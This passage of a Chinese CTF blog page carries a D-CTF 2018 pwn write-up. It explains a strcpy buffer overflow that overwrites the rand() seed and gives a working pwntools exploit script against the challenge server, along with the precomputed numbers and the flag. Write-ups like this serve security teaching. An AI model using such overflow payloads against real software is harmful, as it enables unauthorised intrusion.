class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"What is your name?"</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::getline&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v27);</span><br><span class="line">  LODWORD(v10) = <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::c_str(&amp;v27);</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, v10);</span><br><span class="line">  srand(v35);</span><br><span class="line">  LODWORD(v11) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"I am glad to know you, "</span>);</span><br><span class="line">  LODWORD(v12) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v11, &amp;dest);</span><br><span class="line">  LODWORD(v13) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v12, <span class="string">"!"</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v13, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  LODWORD(v14) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">                   &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">                   <span class="string">"If you guess the next 100 random numbers I shall give you the flag!"</span>);</span><br><span class="line">  LODWORD(v15) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v14, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v15, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v34 = rand();</span><br><span class="line">    LODWORD(v16) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"What number am I thinking of? ["</span>);</span><br><span class="line">    LODWORD(v17) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v16, i);</span><br><span class="line">    LODWORD(v18) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v17, <span class="string">"/100]"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v18, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::getline&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v27);</span><br><span class="line">    v33 = sub_1928(&amp;v27, <span class="number">0L</span>L, <span class="number">10L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v33 != v34 )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v21) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Wow that is wrong!"</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v21, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      v22 = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">    LODWORD(v19) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Wow that is corect!"</span>);</span><br><span class="line">    LODWORD(v20) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v19, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v26);</span><br><span class="line">  <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::basic_ifstream(&amp;v25, <span class="string">"./flag"</span>, <span class="number">8L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::is_open(&amp;v25) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::getline&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v25, &amp;v26);</span><br><span class="line">    LODWORD(v23) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;v26);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v23, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::close(&amp;v25, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::~basic_ifstream(&amp;v25);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v26);</span><br><span class="line">LABEL_15:</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v27);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v29);</span><br><span class="line">  <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::~basic_ifstream(&amp;v30);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v22;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>它首先从<a href="https://www.cnblogs.com/Flychown/p/6868520.html" target="_blank" rel="noopener">/dev/urandom</a>读取种子值并生成随机数。它将此随机数存储在v35中。之后，它使用<code>std :: getline（std :: cin，＆v27）</code>读取用户输入。由于它是一个<code>std :: string</code>，它首先调用<code>c_str（）</code>函数来获取C字符串指针并将该指针存储在<code>v10</code>中。最后，它调用<code>strcpy（＆dest，v10）</code>将我们的字符串复制到<code>dest</code>。好处是在这些操作期间没有长度检查，这意味着我们可以使用缓冲区溢出覆盖其他变量。</p>
+<p>让我们继续我们的分析。</p>
+<p>在读取输入并将其复制到<code>dest</code>后， 它会调用<code>srand（v35）</code>。因此，第一个随机生成的数字实际上是进一步使用的种子值。最后，它使用<code>rand（）</code>生成100个随机数，并期望我们正确猜测它们。</p>
+<p>我们可以看到，从<code>dest</code>到<code>v35</code>的距离是700字节，<strong>这意味着在700个字符之后，接下来的4个字符将覆盖作为种子的<code>v35</code>中的值。由于我们可以根据需要设置种子值，因此我们可以猜测将生成的数字。</strong><br>(我们输入的是dest将覆盖v35)</p>
+<p>既然我们可以控制种子，我们来试试将种子设置为<code>AAAA</code>,</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> seed = <span class="number">0x41414141</span>;#AAAA</span><br><span class="line">srand(seed);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d "</span>, rand());</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>知识点:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pwn</span><br><span class="line">&gt;&gt;&gt; pwn.p32(0x41414141)</span><br><span class="line">&apos;AAAA&apos;</span><br></pre></td></tr></table></figure></p>
+<p>这样来输出一百个伪随机数字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2045728160,999757742,1103458615,457950600,1444241668,459281054,1543513065,1546750049,178068626,1337501091,1398490315,632882557,316733390,627129835,375653904,1151751726,132249441,1178832412,1784493309,36098333,1808153066,1840701539,495212499,111955712,1895620395,1941274903,495499453,177285689,7383240,596865193,1837829365,2053111400,1596622935,793804332,363578353,893380956,1253085387,1907091418,292647357,1431154013,1097108861,1691137672,2064036570,1413842252,170783860,292206826,418110330,303033301,1471039239,55119991,339131634,1131708657,1895821530,834344133,1243664369,1643958278,628135388,1739163822,1821243967,635518628,188545368,1511589684,541146381,1785168303,157910369,904724734,531065611,1410995756,664332504,823712968,694666121,1761441365,367366993,611219043,1027799969,538150853,903425870,1445910299,841184154,226981461,1501030291,1180315788,1358690118,1249368173,2014659921,454870840,745842803,495311661,46551014,419603122,1130830289,235096382,1931192807,1671976670,2020264686,2089103176,429217756,403846649,1352615284,1093550260</span><br></pre></td></tr></table></figure></p>
+<p>wp.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">numbers = [<span class="number">2045728160</span>,<span class="number">999757742</span>,<span class="number">1103458615</span>,<span class="number">457950600</span>,<span class="number">1444241668</span>,<span class="number">459281054</span>,<span class="number">1543513065</span>,<span class="number">1546750049</span>,<span class="number">178068626</span>,<span class="number">1337501091</span>,<span class="number">1398490315</span>,<span class="number">632882557</span>,<span class="number">316733390</span>,<span class="number">627129835</span>,<span class="number">375653904</span>,<span class="number">1151751726</span>,<span class="number">132249441</span>,<span class="number">1178832412</span>,<span class="number">1784493309</span>,<span class="number">36098333</span>,<span class="number">1808153066</span>,<span class="number">1840701539</span>,<span class="number">495212499</span>,<span class="number">111955712</span>,<span class="number">1895620395</span>,<span class="number">1941274903</span>,<span class="number">495499453</span>,<span class="number">177285689</span>,<span class="number">7383240</span>,<span class="number">596865193</span>,<span class="number">1837829365</span>,<span class="number">2053111400</span>,<span class="number">1596622935</span>,<span class="number">793804332</span>,<span class="number">363578353</span>,<span class="number">893380956</span>,<span class="number">1253085387</span>,<span class="number">1907091418</span>,<span class="number">292647357</span>,<span class="number">1431154013</span>,<span class="number">1097108861</span>,<span class="number">1691137672</span>,<span class="number">2064036570</span>,<span class="number">1413842252</span>,<span class="number">170783860</span>,<span class="number">292206826</span>,<span class="number">418110330</span>,<span class="number">303033301</span>,<span class="number">1471039239</span>,<span class="number">55119991</span>,<span class="number">339131634</span>,<span class="number">1131708657</span>,<span class="number">1895821530</span>,<span class="number">834344133</span>,<span class="number">1243664369</span>,<span class="number">1643958278</span>,<span class="number">628135388</span>,<span class="number">1739163822</span>,<span class="number">1821243967</span>,<span class="number">635518628</span>,<span class="number">188545368</span>,<span class="number">1511589684</span>,<span class="number">541146381</span>,<span class="number">1785168303</span>,<span class="number">157910369</span>,<span class="number">904724734</span>,<span class="number">531065611</span>,<span class="number">1410995756</span>,<span class="number">664332504</span>,<span class="number">823712968</span>,<span class="number">694666121</span>,<span class="number">1761441365</span>,<span class="number">367366993</span>,<span class="number">611219043</span>,<span class="number">1027799969</span>,<span class="number">538150853</span>,<span class="number">903425870</span>,<span class="number">1445910299</span>,<span class="number">841184154</span>,<span class="number">226981461</span>,<span class="number">1501030291</span>,<span class="number">1180315788</span>,<span class="number">1358690118</span>,<span class="number">1249368173</span>,<span class="number">2014659921</span>,<span class="number">454870840</span>,<span class="number">745842803</span>,<span class="number">495311661</span>,<span class="number">46551014</span>,<span class="number">419603122</span>,<span class="number">1130830289</span>,<span class="number">235096382</span>,<span class="number">1931192807</span>,<span class="number">1671976670</span>,<span class="number">2020264686</span>,<span class="number">2089103176</span>,<span class="number">429217756</span>,<span class="number">403846649</span>,<span class="number">1352615284</span>,<span class="number">1093550260</span>]</span><br><span class="line"> <span class="comment">#刚才生成的数字</span></span><br><span class="line">r = remote(<span class="string">'167.99.143.206'</span>, <span class="number">65031</span>)</span><br><span class="line">r.recvlines(<span class="number">3</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span> * <span class="number">700</span> + p32(<span class="number">0x41414141</span>))<span class="comment">#保证和之前生成数字时的种子一致</span></span><br><span class="line">r.recvlines(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> number <span class="keyword">in</span> numbers:</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(str(number))</span><br><span class="line">    r.recvlines(<span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br></pre></td></tr></table></figure></p>
+<p>这样我们及控制种子，１００个数字也输对了，flag就get到了<br><code>DCTF{8adadb46b599a58344559e009bc167da7f0e65e64167c27d3192e8b6df073eaa}</code><br>430111200008287946</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://threst.github.io">threst</a>
+            <p>原文链接: <a href="https://threst.github.io/2018/11/02/D-CTFQuals2018/">https://threst.github.io/2018/11/02/D-CTFQuals2018/</a>
+            <p>发表日期: <a href="https://threst.github.io/2018/11/02/D-CTFQuals2018/">November 2nd 2018, 1:32:13</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/11/02/HID/" title= BadUSB初探 >
+                    <div class="nextTitle">BadUSB初探</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/10/16/install/" title= parrot安装 >
+                    <div class="prevTitle">parrot安装</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:3451078463@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/threst" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XORnigma"><span class="toc-number">1.</span> <span class="toc-text">XORnigma</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ransomware"><span class="toc-number">2.</span> <span class="toc-text">Ransomware</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-lucky-are-you-pwn"><span class="toc-number">3.</span> <span class="toc-text">How lucky are you?(pwn)</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive"> Total : 30 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href= "/2018/11/11/ctf/" >无处安放的wp(不定期更)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href= "/2018/11/11/pwn之路_ret2text/" >pwn之路_ret2text</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href= "/2018/11/02/HID/" >BadUSB初探</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href= "/2018/11/02/D-CTFQuals2018/" >D-CTFQuals2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2018/10/16/install/" >parrot安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span><a class="archive-post-title" href= "/2018/10/14/极客大挑战/" >极客大挑战wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "/2018/10/04/网鼎杯wp/" >网鼎杯wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "/2018/10/04/php安全/" >php安全</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "/2018/10/04/Netcat/" >netcat食用指南</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "/2018/10/04/tjctf2018misc/" >tjctf2018wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "/2018/10/04/csaw2018wp/" >csaw 2018 wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "/2018/10/04/phpgd绕过/" >phpgd绕过</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href= "/2018/09/18/cve-2017-11882/" >CVE-2017-11882复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/2018/09/15/noxctf2018wp/" >noxctf2018wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2018/09/11/CVE-2017-8464漏洞复现/" >CVE-2017-8464漏洞复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/09</span><a class="archive-post-title" href= "/2018/09/09/双杀0day漏洞(CVE-2018-8174)复现/" >双杀0day漏洞(CVE-2018-8174)复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/28</span><a class="archive-post-title" href= "/2018/08/28/CTF之隐写术/" >ctf之隱寫術</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/15</span><a class="archive-post-title" href= "/2018/06/15/kali破解xp开机密码/" >艰难的kali破解xp开机密码之路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span><a class="archive-post-title" href= "/2018/06/06/利用 PATH 环境变量进行 Linux 提权/" >利用 PATH 环境变量进行 Linux 提权</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span><a class="archive-post-title" href= "/2018/06/01/61随想/" >61随想</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span><a class="archive-post-title" href= "/2018/06/01/常见文件格式分析/" >常见文件格式分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span><a class="archive-post-title" href= "/2018/06/01/如何在MIMIKATZ添加模块/" >如何在MIMIKATZ添加模块</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/实验吧wp/" >实验吧wp(持续更新)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href= "/2018/05/29/kali安装docker/" >kali下安装docker</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href= "/2018/05/22/你肯定不知道的GraphQL安全概述和测试技巧/" >你肯定不知道的GraphQL安全概述和测试技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href= "/2018/05/17/git一条龙(一看就会的那种)/" >git一条龙(一看就会的那种)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2018/05/12/逆向工程基础 - Linux x64/" >逆向入门--linux64</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2018/05/12/逆向工程入门— ARM64上的Linux/" >逆向入门--ARM64的linux</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
